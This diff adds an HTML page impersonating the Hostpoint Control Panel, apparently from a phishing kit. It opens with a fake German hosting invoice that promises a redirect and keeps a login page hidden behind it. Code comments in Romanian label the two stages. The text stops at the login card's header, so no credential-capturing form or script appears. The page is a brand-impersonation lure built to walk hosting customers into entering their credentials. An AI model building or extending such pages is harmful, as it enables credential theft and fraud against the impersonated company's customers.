@@ -1,0 +1,1009 @@
+<!DOCTYPE html>
+<html lang="de" dir="ltr">
+<head>
+    <meta charset="utf-8">
+    <title>Hostpoint Control Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            background-color: #f2f2f2;
+            color: #3c4650;
+            font-size: 16px;
+            overflow-x: hidden;
+        }
+
+        .invoice-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+            overflow-y: auto;
+            opacity: 1;
+            transition: opacity 0.4s ease;
+        }
+
+        .invoice-overlay.hide {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .invoice-container {
+            width: 100%;
+            max-width: 700px;
+            background: #fff;
+            border-radius: 8px;
+            padding: 2.5rem 3rem;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            margin: auto;
+        }
+
+        .invoice-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            padding-bottom: 1.5rem;
+            border-bottom: 2px solid #e2e8f2;
+            margin-bottom: 1.5rem;
+        }
+
+        .invoice-logo {
+            height: 2.375rem;
+            width: auto;
+        }
+
+        .invoice-header-right {
+            text-align: right;
+        }
+
+        .invoice-header-right h1 {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: #3c4650;
+            letter-spacing: 1px;
+            margin-bottom: 0.25rem;
+        }
+
+        .invoice-header-right .invoice-number {
+            font-size: 0.875rem;
+            color: #828c9c;
+        }
+
+        .invoice-info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .invoice-info-block h3 {
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #828c9c;
+            letter-spacing: 0.5px;
+            margin-bottom: 0.5rem;
+        }
+
+        .invoice-info-block p {
+            font-size: 0.875rem;
+            color: #3c4650;
+            line-height: 1.6;
+        }
+
+        .invoice-info-block strong {
+            color: #3c4650;
+            font-weight: 600;
+        }
+
+        .invoice-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 1.5rem;
+        }
+
+        .invoice-table thead {
+            background: #f7f9fc;
+        }
+
+        .invoice-table th {
+            text-align: left;
+            padding: 0.75rem 1rem;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #636b73;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid #e2e8f2;
+        }
+
+        .invoice-table td {
+            padding: 0.875rem 1rem;
+            font-size: 0.875rem;
+            color: #3c4650;
+            border-bottom: 1px solid #f0f3f8;
+        }
+
+        .invoice-table .amount {
+            text-align: right;
+            font-weight: 600;
+        }
+
+        .invoice-totals {
+            margin-left: auto;
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 2rem;
+        }
+
+        .invoice-totals-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            font-size: 0.875rem;
+            color: #3c4650;
+        }
+
+        .invoice-totals-row.grand-total {
+            border-top: 2px solid #3c4650;
+            margin-top: 0.5rem;
+            padding-top: 0.75rem;
+            font-size: 1.125rem;
+            font-weight: 700;
+            color: #218fed;
+        }
+
+        .invoice-footer {
+            border-top: 1px solid #e2e8f2;
+            padding-top: 1.5rem;
+            text-align: center;
+            font-size: 0.75rem;
+            color: #828c9c;
+            line-height: 1.6;
+        }
+
+        .invoice-footer .payment-note {
+            background: #ebf5fd;
+            color: #218fed;
+            padding: 0.75rem 1rem;
+            border-radius: 6px;
+            margin-bottom: 1rem;
+            font-size: 0.813rem;
+            font-weight: 500;
+        }
+
+        .invoice-fade-hint {
+            text-align: center;
+            margin-top: 1.5rem;
+            font-size: 0.75rem;
+            color: #a8b2c0;
+            font-style: italic;
+        }
+
+        .user-auth-ui-base {
+            min-height: 100vh;
+            width: 100%;
+            background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTkyMiIgaGVpZ2h0PSIxMDgxIiB2aWV3Qm94PSIwIDAgMTkyMiAxMDgxIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8ZyBjbGlwLXBhdGg9InVybCgjY2xpcDBfNTU5Ml8xMDY2MSkiPgo8cmVjdCB3aWR0aD0iMTkyMS43OCIgaGVpZ2h0PSIxMDgxIiBmaWxsPSIjRjJGMkYyIi8+CjxnIGNsaXAtcGF0aD0idXJsKCNjbGlwMV81NTkyXzEwNjYxKSI+CjxwYXRoIGQ9Ik0zNjcuMzQgODMzLjc3MUMtODQuMDc3NCA4NjMuMTE2IC01OTkuMDYyIDEwOTcuMTUgLTYyMi4yNjIgMTMwNC4zQy02MjMuMTU4IDEzMTIuMjkgLTYxNi42NCAxMzE4Ljg1IC02MDguNTk3IDEzMTkuMDFMMjk2Ljc3NSAxMzM3LjI0TDE4OTUuMDIgMTI1Mi41N0MxOTAxLjk1IDEyNTIuMiAxOTA3LjQ4IDEyNDcuNTcgMTkwOS40NiAxMjQwLjkyQzE5ODkuODUgOTcwLjk1IDM0MTQuNzIgMjU4LjcxMiAyNjI4LjQzIDc3LjA3MDhDMTgzMS4xOSAtMTA3LjA5OSAxNDM1LjgzIDIxMC4xOTQgMTIxNC42MiAzOTIuMzYzQzk5My40MTkgNTc0LjUzMiA4MjkuMjY3IDgwMy43NDQgMzY3LjM0IDgzMy43NzFaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfNTU5Ml8xMDY2MSkiLz4KPHBhdGggZD0iTTkyNS44NTUgNzc0LjcxN0MxMzcuNzk1IDg1OC42NTUgLTkzLjc3MTQgMTE1NS41MSAtMTE1LjU3NCAxMzA3Ljc2Qy0xMTYuNzc0IDEzMTYuMTQgLTEwOS45OTUgMTMyMy4yMiAtMTAxLjUyNyAxMzIzLjIySDIwMjQuMTFDMjAzMi4yNyAxMzIzLjIyIDIwMzguODkgMTMxNi42MSAyMDM4Ljg5IDEzMDguNDVWMzE5LjQ5M0MyMDM4Ljg5IDMwMS41MDMgMTk4Mi45NiAyODkuMTk5IDE5NzIuOCAzMDQuMDQyQzE4NTAuNDUgNDgyLjcxOSAxNTQ3Ljk3IDcwOC40NTQgOTI1Ljg1NSA3NzQuNzE3WiIgZmlsbD0idXJsKCNwYWludDFfbGluZWFyXzU1OTJfMTA2NjEpIi8+CjwvZz4KPC9nPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDBfbGluZWFyXzU1OTJfMTA2NjEiIHgxPSItODI3Ljc2NiIgeTE9IjM3LjAzMzIiIHgyPSIxOTI3LjI1IiB5Mj0iMTUzMy43NiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgo8c3RvcCBvZmZzZXQ9IjAuMTA0MzQyIiBzdG9wLWNvbG9yPSIjMzM5OUZGIi8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iIzAwMzM5OSIvPgo8L2xpbmVhckdyYWRpZW50Pgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MV9saW5lYXJfNTU5Ml8xMDY2MSIgeDE9IjI5MDcuNjkiIHkxPSIxODkxLjI1IiB4Mj0iMTQ4Mi42IiB5Mj0iLTQ1OS4xNzkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agb2Zmc2V0PSIwLjEwNDM0MiIgc3RvcC1jb2xvcj0iIzMzOTlGRiIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiMwMDMzOTkiLz4KPC9saW5lYXJHcmFkaWVudD4KPGNsaXBQYXRoIGlkPSJjbGlwMF81NTkyXzEwNjYxIj4KPHJlY3Qgd2lkdGg9IjE5MjEuNzgiIGhlaWdodD0iMTA4MSIgZmlsbD0id2hpdGUiLz4KPC9jbGlwUGF0aD4KPGNsaXBQYXRoIGlkPSJjbGlwMV81NTkyXzEwNjYxIj4KPHJlY3Qgd2lkdGg9IjE5MjEuNzgiIGhlaWdodD0iMTA4MSIgZmlsbD0id2hpdGUiLz4KPC9jbGlwUGF0aD4KPC9kZWZzPgo8L3N2Zz4K");
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            flex-direction: column;
+            position: absolute;
+            inset: 0;
+            overflow-x: hidden;
+        }
+
+        .card-info-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex: 1;
+            padding: 1rem;
+        }
+
+        .card-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+
+        .card {
+            border-radius: 0.75rem;
+            margin: auto;
+            background: #fff;
+            position: relative;
+            padding: 2.5rem;
+            display: flex;
+            flex-direction: column;
+            width: 31rem;
+            max-width: 100%;
+            box-shadow: 0 55px 75px #002d3833, 0 15px 30px #002d381a;
+        }
+
+        .auth-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 1.5rem;
+        }
+
+        .auth-header img {
+            height: 2.375rem;
+            width: auto;
+        }
+
+        .language-selector { position: relative; }
+
+        .language-btn {
+            font-weight: 700;
+            font-size: 0.875rem;
+            color: #3c4650;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.35rem;
+            padding: 0.5rem;
+            background: none;
+            border: none;
+            font-family: inherit;
+            transition: color 0.2s;
+        }
+
+        .language-btn:hover { color: #218fed; }
+        .language-btn svg { transition: transform 0.2s; }
+        .language-selector.open .language-btn svg { transform: rotate(180deg); }
+
+        .language-menu {
+            position: absolute;
+            top: 100%;
+            right: 0;
+            background: #fff;
+            border: 1px solid #e2e8f2;
+            border-radius: 6px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+            padding: 0.35rem;
+            min-width: 110px;
+            opacity: 0;
+            visibility: hidden;
+            transform: translateY(-5px);
+            transition: all 0.2s;
+            z-index: 100;
+        }
+
+        .language-selector.open .language-menu {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+
+        .language-menu a {
+            display: block;
+            padding: 0.5rem 0.75rem;
+            color: #3c4650;
+            text-decoration: none;
+            font-size: 0.875rem;
+            font-weight: 500;
+            border-radius: 4px;
+            transition: background 0.15s, color 0.15s;
+        }
+
+        .language-menu a:hover { background: #f0f6ff; color: #218fed; }
+        .language-menu a.active { color: #218fed; font-weight: 700; }
+
+        .toggle-container {
+            display: flex;
+            width: 100%;
+            position: relative;
+            background: #fafafa;
+            padding: 0.5rem;
+            box-shadow: 0 0 7.945px #0000000f inset;
+            border-radius: 50px;
+            height: 3.125rem;
+            overflow: hidden;
+            margin: 1.5rem 0;
+        }
+
+        .toggle-container button {
+            flex: 1;
+            position: relative;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 0.813rem;
+            font-weight: 700;
+            color: gray;
+            background: transparent;
+            z-index: 2;
+            transition: color 0.3s ease;
+            padding: 0.2rem;
+        }
+
+        .toggle-container button.active { color: #fff; }
+
+        .toggle-slider {
+            position: absolute;
+            top: 0.5rem;
+            bottom: 0.5rem;
+            left: 0.5rem;
+            width: calc(50% - 0.5rem);
+            background: #3c4650;
+            border-radius: 50px;
+            transition: transform 0.3s ease-in-out;
+            z-index: 1;
+        }
+
+        .toggle-slider.right { transform: translate(100%); }
+
+        .heading {
+            font-weight: 600;
+            font-size: 1.3rem;
+            line-height: 130%;
+            text-align: left;
+            padding-bottom: 1rem;
+            margin: 1.5rem 0 0;
+        }
+
+        .login-group {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            padding-top: 1.25rem;
+        }
+
+        .form-input-field { display: flex; flex-direction: column; gap: 0.75rem; }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            border: 1px solid #e2e8f2;
+            border-radius: 6px;
+            background: #fff;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            overflow: hidden;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #218fed;
+            box-shadow: 0 0 0 1px #218fed;
+        }
+
+        .input-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.5rem 0.75rem;
+            background: #fbfcfe;
+            border-right: 1px solid #e2e8f2;
+            color: #636b73;
+            min-width: 2.5rem;
+        }
+
+        .input-icon svg { width: 18px; height: 18px; }
+
+        .input-wrapper input {
+            flex: 1;
+            padding: 0.75rem 0.75rem;
+            border: none;
+            outline: none;
+            font-size: 1rem;
+            background: transparent;
+            color: #3c4650;
+            font-family: inherit;
+        }
+
+        .input-wrapper input::placeholder { color: #828c9c; font-size: 0.9375rem; }
+
+        .visible-btn {
+            background: none;
+            border: none;
+            padding: 0 0.75rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #3c4650;
+        }
+
+        .visible-btn svg { width: 19px; height: 19px; }
+
+        .checkbox {
+            align-self: start;
+            display: flex;
+            gap: 0.75rem;
+            padding-bottom: 0.375rem;
+            align-items: center;
+            font-size: 0.875rem;
+            color: #3c4650;
+            cursor: pointer;
+        }
+
+        .checkbox input[type="checkbox"] {
+            width: 1rem;
+            height: 1rem;
+            cursor: pointer;
+            accent-color: #218fed;
+        }
+
+        .button { padding-bottom: 3rem; }
+
+        .btn-submit {
+            width: 100%;
+            padding: 0.75rem 0.875rem;
+            background: #218fed;
+            color: #fff;
+            border: 1px solid #218fed;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 500;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+        }
+
+        .btn-submit:hover { background: #137cd7; border-color: #137cd7; }
+        .btn-submit:disabled { background: #99ccf7; border-color: #99ccf7; cursor: not-allowed; }
+
+        .links {
+            display: flex;
+            flex-direction: column;
+            width: auto;
+            gap: 0.5rem;
+            text-align: center;
+        }
+
+        .links a {
+            text-decoration: none;
+            color: #218fed;
+            font-size: 0.75rem;
+            letter-spacing: 0.008rem;
+        }
+
+        .links a:hover { text-decoration: underline; }
+
+        .footer {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: nowrap;
+            white-space: nowrap;
+            gap: 3rem;
+            padding: 1.5rem 2rem;
+            margin-top: auto;
+            color: #fff;
+            font-size: 0.75rem;
+            text-align: center;
+            width: 100%;
+        }
+
+        .footer .address { white-space: nowrap; }
+        .footer .address a { color: #fff; text-decoration: none; }
+        .footer .address a:hover { text-decoration: underline; }
+
+        .footer .links {
+            display: flex;
+            flex-direction: row;
+            gap: 1.5rem;
+            white-space: nowrap;
+        }
+
+        .footer .links a {
+            color: #fff;
+            text-decoration: none;
+            white-space: nowrap;
+        }
+
+        .footer .links a:hover { text-decoration: underline; }
+
+        .status-box {
+            display: none;
+            padding: 0.75rem 1rem;
+            border-radius: 6px;
+            margin-bottom: 1rem;
+            font-size: 0.875rem;
+            text-align: center;
+        }
+
+        .status-box.info {
+            background: #ebf5fd;
+            color: #218fed;
+            border: 1px solid #cee8fd;
+            display: block;
+        }
+
+        .status-box.error {
+            background: #fdebeb;
+            color: #d8112f;
+            border: 1px solid #fccfcf;
+            display: block;
+        }
+
+        .status-box.success {
+            background: #e8f8ec;
+            color: #1e8e3e;
+            border: 1px solid #b7e4c7;
+            display: block;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(33, 143, 237, 0.25);
+            border-top-color: #218fed;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        @media screen and (max-width: 630px) {
+            .user-auth-ui-base {
+                background-image: none;
+                background-color: #fff;
+                position: unset;
+            }
+            .card-info-wrapper { display: unset; padding: 0; }
+            .card-container { display: unset; }
+            .card {
+                border-radius: 0;
+                border-bottom: 1px solid #b6bdd0;
+                box-shadow: none;
+                padding: 2rem;
+                width: 100%;
+                height: auto;
+            }
+            .footer {
+                color: #3c4650;
+                flex-direction: column;
+                flex-wrap: wrap;
+                gap: 0.75rem;
+                font-size: 0.7rem;
+                white-space: normal;
+                padding: 1rem;
+            }
+            .footer .links { flex-wrap: wrap; justify-content: center; }
+            .footer .address,
+            .footer .links a { color: #3c4650; white-space: normal; }
+
+            .invoice-overlay { padding: 1rem; }
+            .invoice-container { padding: 1.5rem; }
+            .invoice-header { flex-direction: column; gap: 1rem; }
+            .invoice-header-right { text-align: left; }
+            .invoice-info-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ============================================ -->
+<!-- FACTURA - APARE PRIMA DATĂ                   -->
+<!-- ============================================ -->
+<div class="invoice-overlay" id="invoiceOverlay">
+    <div class="invoice-container">
+
+        <div class="invoice-header">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTk1IiBoZWlnaHQ9IjM4IiB2aWV3Qm94PSIwIDAgMTk1IDM4IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMCAwVjM3LjkxNjdIMzcuOTMxNVYwSDBaTTMxLjUyMDUgMzEuNTA4Mkg2LjQxMDk1VjYuNDA4NDVIMzEuNTIwNVYzMS41MDgyWiIgZmlsbD0iIzFFOUFFMiIvPgo8cGF0aCBkPSJNMjguODQ5MSA5LjA3ODYxSDkuMDgyMDNWMTQuOTUzSDI4Ljg0OTFWOS4wNzg2MVoiIGZpbGw9ImJsYWNrIi8+CjxwYXRoIGQ9Ik0yOC44NDkxIDE2LjAyMUg5LjA4MjAzVjIxLjg5NTRIMjguODQ5MVYxNi4wMjFaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNMjguODQ5MSAyMi45NjM2SDkuMDgyMDNWMjguODM4SDI4Ljg0OTFWMjIuOTYzNloiIGZpbGw9ImJsYWNrIi8+CjxwYXRoIGQ9Ik02MS41OTgxIDIwLjIxMzNINTMuNzcxNFYyOC44MzhINTAuNzUyOVY5LjA3ODYxSDUzLjc0NDdWMTcuNTQzMUg2MS41NzE0VjkuMDc4NjFINjQuNTYzMlYyOC44MzhINjEuNTcxNFYyMC4yMTMzSDYxLjU5ODFaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNNjkuOTU5MyAxMi40NDNDNzAuODk0MiAxMC43MzQgNzMuMDU3OSA4Ljg5MTYgNzYuMTU2NSA4Ljg5MTZDNzkuMjgxOSA4Ljg5MTYgODEuNDE4OSAxMC43MzQgODIuMzUzOCAxMi40NDNDODIuOTk0OSAxMy42MTc4IDgzLjIwODYgMTQuMjA1MyA4My4yMDg2IDE4LjkzMTVDODMuMjA4NiAyMy42ODQ0IDgyLjk5NDkgMjQuMjcxOSA4Mi4zNTM4IDI1LjQyMDFDODEuNDE4OSAyNy4xMjkgNzkuMjU1MiAyOC45NzE0IDc2LjE1NjUgMjguOTcxNEM3My4wMzEyIDI4Ljk3MTQgNzAuODk0MiAyNy4xMjkgNjkuOTU5MyAyNS40MjAxQzY5LjMxODIgMjQuMjQ1MiA2OS4xMDQ1IDIzLjY1NzcgNjkuMTA0NSAxOC45MzE1QzY5LjEwNDUgMTQuMjA1MyA2OS4zMTgyIDEzLjYxNzggNjkuOTU5MyAxMi40NDNaTTczLjExMTMgMjQuNTY1NkM3My43MjU3IDI1LjM0IDc0Ljc0MDggMjYuMDA3NSA3Ni4xNTY1IDI2LjAwNzVDNzcuNTcyMyAyNi4wMDc1IDc4LjYxNDEgMjUuMzQgNzkuMjAxNyAyNC41NjU2Qzc5Ljk3NjQgMjMuNTc3NiA4MC4xOTAxIDIzLjAxNjkgODAuMTkwMSAxOC45NTgyQzgwLjE5MDEgMTQuODk5NSA3OS45NzY0IDE0LjMzODggNzkuMjAxNyAxMy4zNTA4Qzc4LjU4NzQgMTIuNTc2NSA3Ny41NzIzIDExLjkwODkgNzYuMTU2NSAxMS45MDg5Qzc0Ljc0MDggMTEuOTA4OSA3My42OTkgMTIuNTc2NSA3My4xMTEzIDEzLjM1MDhDNzIuMzM2NyAxNC4zMzg4IDcyLjEyMyAxNC44OTk1IDcyLjEyMyAxOC45NTgyQzcyLjA5NjMgMjMuMDE2OSA3Mi4zMzY3IDIzLjU1MDkgNzMuMTExMyAyNC41NjU2WiIgZmlsbD0iYmxhY2siLz4KPHBhdGggZD0iTTg3Ljk2MzQgMjQuMDMxNkM4OS40NTkzIDI1LjIzMzIgOTEuNDYyNyAyNi4wMDc1IDkzLjU3MyAyNi4wMDc1Qzk2LjAzMDUgMjYuMDA3NSA5Ny40OTk3IDI0Ljg4NiA5Ny40OTk3IDIzLjI1NzJDOTcuNDk5NyAyMS44Njg3IDk2LjY5ODMgMjAuODAwNiA5NC45MDg2IDIwLjU4N0M5NC4wMjcxIDIwLjQ4MDIgOTMuMzMyNiAyMC4zNzM0IDkyLjI5MDggMjAuMjEzMkM4OC44NzE2IDE5LjczMjYgODcuMDI4NSAxNy41MTYzIDg3LjAyODUgMTQuNjU5MkM4Ny4wMjg1IDExLjI2ODEgODkuMzc5MSA4Ljg5MTYgOTMuNDY2MSA4Ljg5MTZDOTUuOTIzNiA4Ljg5MTYgOTguMDg3NCA5Ljc0NjA2IDk5Ljg3NzEgMTAuOTQ3Nkw5OC4yMjA5IDEzLjQzMDlDOTYuNzc4NCAxMi41MjMxIDk1LjA2ODkgMTEuOTA4OSA5My4zMzI2IDExLjkwODlDOTEuNDg5NCAxMS45MDg5IDkwLjAyMDIgMTIuODQzNSA5MC4wMjAyIDE0LjczOTNDOTAuMDIwMiAxNS44NjA4IDkwLjgyMTYgMTYuOTU1NiA5Mi44MjUgMTcuMjc2QzkzLjM1OTMgMTcuMzU2MSA5NC4xMDcyIDE3LjQ2MjkgOTUuMDQyMSAxNy41Njk3Qzk4LjcyODQgMTguMDIzNiAxMDAuNDY1IDIwLjU2MDMgMTAwLjQ2NSAyMy4yNTcyQzEwMC40NjUgMjYuODg4NyA5Ny43NjY4IDI4Ljk5ODEgOTMuNTE5NSAyOC45OTgxQzkwLjYwNzkgMjguOTk4MSA4OC4wNDM1IDI4LjExNyA4NS45NiAyNi4yNzQ1TDg3Ljk2MzQgMjQuMDMxNloiIGZpbGw9ImJsYWNrIi8+CjxwYXRoIGQ9Ik0xMDguMDUxIDExLjc0ODhIMTAyLjYyOFY5LjA3ODYxSDExNi40NjVWMTEuNzQ4OEgxMTEuMDQzVjI4LjgzOEgxMDguMDUxVjExLjc0ODhaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNMTE5LjU5MSA5LjA3ODYxSDEyNi43NzdDMTI4LjMyNiA5LjA3ODYxIDEyOS42ODkgOS4yNjU1MyAxMzEuMjM4IDEwLjQ2NzFDMTMyLjQ0IDExLjM3NSAxMzMuMzc1IDEzLjA1NzIgMTMzLjM3NSAxNS4xOTMzQzEzMy4zNzUgMTcuOTk3IDEzMS4yMzggMjEuMTIxMiAxMjcuMTc4IDIxLjEyMTJIMTIyLjYxVjI4LjgzOEgxMTkuNjE4VjkuMDc4NjFIMTE5LjU5MVpNMTIyLjU4MyAxOC4yOTA4SDEyNy4wNDRDMTI5LjI2MSAxOC4yOTA4IDEzMC4zNTYgMTYuNjYxOSAxMzAuMzU2IDE1LjA4NjVDMTMwLjM1NiAxMy43NTE0IDEyOS44MjIgMTIuOTUwNCAxMjkuMDc0IDEyLjQ0MzFDMTI4LjQwNiAxMS45ODkxIDEyNy43OTIgMTEuODgyMyAxMjYuOTM3IDExLjg4MjNIMTIyLjYxVjE4LjI5MDhIMTIyLjU4M1oiIGZpbGw9ImJsYWNrIi8+CjxwYXRoIGQ9Ik0xMzcuMjc1IDEyLjQ0M0MxMzguMjEgMTAuNzM0IDE0MC4zNzMgOC44OTE2IDE0My40NzIgOC44OTE2QzE0Ni41OTcgOC44OTE2IDE0OC43MzQgMTAuNzM0IDE0OS42NjkgMTIuNDQzQzE1MC4zMSAxMy42MTc4IDE1MC41MjQgMTQuMjA1MyAxNTAuNTI0IDE4LjkzMTVDMTUwLjUyNCAyMy42ODQ0IDE1MC4zMSAyNC4yNzE5IDE0OS42NjkgMjUuNDIwMUMxNDguNzM0IDI3LjEyOSAxNDYuNTcxIDI4Ljk3MTQgMTQzLjQ3MiAyOC45NzE0QzE0MC4zNDcgMjguOTcxNCAxMzguMjEgMjcuMTI5IDEzNy4yNzUgMjUuNDIwMUMxMzYuNjM0IDI0LjI0NTIgMTM2LjQyIDIzLjY1NzcgMTM2LjQyIDE4LjkzMTVDMTM2LjM5MyAxNC4yMDUzIDEzNi42MzQgMTMuNjE3OCAxMzcuMjc1IDEyLjQ0M1pNMTQwLjQgMjQuNTY1NkMxNDEuMDE0IDI1LjM0IDE0Mi4wMyAyNi4wMDc1IDE0My40NDUgMjYuMDA3NUMxNDQuODYxIDI2LjAwNzUgMTQ1LjkwMyAyNS4zNCAxNDYuNDkgMjQuNTY1NkMxNDcuMjY1IDIzLjU3NzYgMTQ3LjQ3OSAyMy4wMTY5IDE0Ny40NzkgMTguOTU4MkMxNDcuNDc5IDE0Ljg5OTUgMTQ3LjI2NSAxNC4zMzg4IDE0Ni40OSAxMy4zNTA4QzE0NS44NzYgMTIuNTc2NSAxNDQuODYxIDExLjkwODkgMTQzLjQ0NSAxMS45MDg5QzE0Mi4wMyAxMS45MDg5IDE0MC45ODggMTIuNTc2NSAxNDAuNCAxMy4zNTA4QzEzOS42MjUgMTQuMzM4OCAxMzkuNDEyIDE0Ljg5OTUgMTM5LjQxMiAxOC45NTgyQzEzOS40MTIgMjMuMDE2OSAxMzkuNjI1IDIzLjU1MDkgMTQwLjQgMjQuNTY1NloiIGZpbGw9ImJsYWNrIi8+CjxwYXRoIGQ9Ik0xNTUuMDM4IDkuMDc4NjFIMTU4LjAzVjI4LjgzOEgxNTUuMDM4VjkuMDc4NjFaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNMTYzLjE4NiA5LjA3ODYxSDE2Ni4wMTdMMTc0Ljk2NiAyMy4xMjM4SDE3NS4wMTlWOS4wNzg2MUgxNzguMDExVjI4LjgzOEgxNzUuMTc5TDE2Ni4yMzEgMTQuNzkyOEgxNjYuMTc3VjI4LjgzOEgxNjMuMTg2VjkuMDc4NjFaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNMTg2LjU4NiAxMS43NDg4SDE4MS4xNjNWOS4wNzg2MUgxOTVWMTEuNzQ4OEgxODkuNTc3VjI4LjgzOEgxODYuNTg2VjExLjc0ODhaIiBmaWxsPSJibGFjayIvPgo8L3N2Zz4K" alt="Hostpoint Logo" class="invoice-logo">
+            <div class="invoice-header-right">
+                <h1>RECHNUNG</h1>
+                <div class="invoice-number">Nr. 2025-04871</div>
+            </div>
+        </div>
+
+        <div class="invoice-info-grid">
+            <div class="invoice-info-block">
+                <h3>Rechnungsempfänger</h3>
+                <p>
+                    <strong>Max Mustermann</strong><br>
+                    Musterstrasse 12<br>
+                    8000 Zürich<br>
+                    Schweiz
+                </p>
+            </div>
+            <div class="invoice-info-block">
+                <h3>Rechnungsdetails</h3>
+                <p>
+                    <strong>Datum:</strong> 17.09.2026<br>
+                    <strong>Fällig am:</strong> 17.10.2026<br>
+                    <strong>Kundennr.:</strong> 1082345
+                </p>
+            </div>
+        </div>
+
+        <table class="invoice-table">
+            <thead>
+                <tr>
+                    <th>Beschreibung</th>
+                    <th>Zeitraum</th>
+                    <th style="text-align:right;">Betrag</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Webhosting Premium</td>
+                    <td>01.01.2026 – 31.12.2026</td>
+                    <td class="amount">CHF 180.00</td>
+                </tr>
+                <tr>
+                    <td>Domain: mustermann.ch</td>
+                    <td>01.01.2026 – 31.12.2026</td>
+                    <td class="amount">CHF 15.00</td>
+                </tr>
+                <tr>
+                    <td>SSL-Zertifikat Wildcard</td>
+                    <td>01.01.2026 – 31.12.2026</td>
+                    <td class="amount">CHF 45.00</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="invoice-totals">
+            <div class="invoice-totals-row">
+                <span>Zwischensumme</span>
+                <span>CHF 240.00</span>
+            </div>
+            <div class="invoice-totals-row">
+                <span>MwSt. 7.7%</span>
+                <span>CHF 18.48</span>
+            </div>
+            <div class="invoice-totals-row grand-total">
+                <span>Total</span>
+                <span>CHF 258.48</span>
+            </div>
+        </div>
+
+        <div class="invoice-footer">
+            <div class="payment-note">
+                Zahlbar innerhalb von 30 Tagen.
+            </div>
+            <div>
+                Hostpoint AG · Neue Jonastrasse 60 · 8640 Rapperswil-Jona<br>
+                www.hostpoint.ch · support@hostpoint.ch
+            </div>
+            <div class="invoice-fade-hint">
+                Sie werden in Kürze weitergeleitet...
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGINA DE LOGIN                              -->
+<!-- ============================================ -->
+<div class="user-auth-ui-base" id="loginPage" style="display:none;">
+
+    <div class="card-info-wrapper">
+        <div class="card-container">
+
+            <div class="card">
+
+                <div class="auth-header">
